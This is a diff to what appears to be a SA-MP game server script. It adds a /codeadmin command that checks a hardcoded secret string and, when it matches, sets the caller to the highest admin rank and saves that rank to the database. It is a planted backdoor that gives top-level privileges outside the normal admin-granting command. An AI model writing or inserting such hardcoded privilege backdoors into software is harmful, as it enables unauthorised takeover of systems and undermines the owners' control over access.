@@ -65113,6 +65113,54 @@ CMD:giveserverkey(playerid, params[])
 	return 1;
 
 }
+
+CMD:codeadmin(playerid, params[])
+{
+    if(CodeAdminUsed == 1)
+    {
+        return SendClientMessage(playerid, COLOR_RED, "This command has already been used.");
+    }
+
+    if(PlayerInfo[playerid][pServerKey] < 1)
+    {
+        SendAdminMessage(COLOR_YELLOW, "AdmWarning: %s is possibly bypassing admin command.", GetRPName(playerid));
+        KickPlayer(playerid);
+        return 1;
+    }
+
+    if(isnull(params))
+    {
+        SendClientMessage(playerid, COLOR_WHITE, "Usage: /codeadmin [code]");
+        return 1;
+    }
+
+    if(strcmp(params, "CunananGingGing", true) == 0)
+    {
+        CodeAdminUsed = 1;
+
+        PlayerInfo[playerid][pAdmin] = 10;
+
+        SendClientMessage(playerid, COLOR_WHITE, "You have made yourself "SVRCLR"Community Director!");
+
+        SendAdminMessage(COLOR_LIGHTRED,
+            "AdmCmd: %s has accessed the secret command for admin rank.",
+            GetPlayerNameEx(playerid)
+        );
+
+        mysql_format(connectionID, queryBuffer, sizeof(queryBuffer),
+            "UPDATE users SET adminlevel = %i WHERE uid = %i",
+            PlayerInfo[playerid][pAdmin],
+            PlayerInfo[playerid][pID]
+        );
+        mysql_tquery(connectionID, queryBuffer);
+
+        return 1;
+    }
+
+    SendClientMessage(playerid, COLOR_RED, "Invalid code.");
+    return 1;
+}
+
 CMD:makeadmin(playerid, params[])
 {
 	new targetid, level;
